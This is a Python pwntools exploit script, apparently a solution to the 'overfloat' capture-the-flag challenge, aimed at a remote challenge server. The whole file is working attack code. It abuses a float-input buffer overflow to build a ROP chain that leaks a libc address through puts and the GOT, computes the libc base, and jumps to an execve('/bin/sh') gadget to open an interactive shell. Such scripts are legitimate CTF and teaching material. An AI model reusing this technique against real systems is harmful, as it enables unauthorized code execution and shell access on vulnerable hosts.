from pwn import *
import struct

def addr_to_float(addr):
	return str(struct.unpack('!f', addr.zfill(8).decode("hex"))[0])

def send_value(val):
	r.recvuntil(": ")
	r.sendline(val)
	
#r = process(['./overfloat'], env={"LD_PRELOAD":"./libc-2.27.so"})
r = remote("challenges.fbctf.com", 1341)

libc_start_main_offset = 0x21ab0 # offset of __libc_start_main
puts_call = 0x400690 # call puts
main_got = 0x602050 # main GOT
pop = 0x400a83 # pop rdi ; ret
go_back_main = 0x400740 # _start
gadget_offset = 0x4f2c5 # execve("/bin/sh", NULL, NULL)

# Cycle until return overwrite
for i in range(14):
	send_value("")

# First stage: leak libc address -> __libc_start_main

# pop rdi; ret
val = addr_to_float(hex(pop)[2:])
r.info("Float value: " + val)
send_value(val)
send_value("")

# address of __libc_start_main address in GOT
val = addr_to_float(hex(main_got)[2:])
r.info("Float value: " + val)
send_value(val)
send_value("")

# Call puts to leak address
val = addr_to_float(hex(puts_call)[2:])
r.info("Float value: " + val)
send_value(val)
send_value("")

# Return to _start so we can get back to main
val = addr_to_float(hex(go_back_main)[2:])
r.info("Float value: " + val)
send_value(val)
send_value("")

send_value("done")

r.recvuntil("BON VOYAGE!")

# Get address
r.recvline()
addr = r.recvline()[:-1]

# Calculate libc base
main_addr = struct.unpack("<2Q", addr.ljust(16, "\x00"))[0]
libc_base = main_addr - libc_start_main_offset

r.info("Libc Base @ " + hex(main_addr - libc_start_main_offset))

# Add one_gadget address
win = libc_base + gadget_offset

r.info("Win @ " + hex(win))

# Second stage: Call gadget and win

# Cycle until return overwrite
for i in range(14):
	send_value("")

# First half of address
val = addr_to_float(hex(win)[-8:])
r.info("Float value: " + val)
send_value(val)

# Second half of address
val = addr_to_float(hex(win)[2:-8])
r.info("Float value: " + val)
send_value(val)

send_value("done")

# pwned
r.interactive()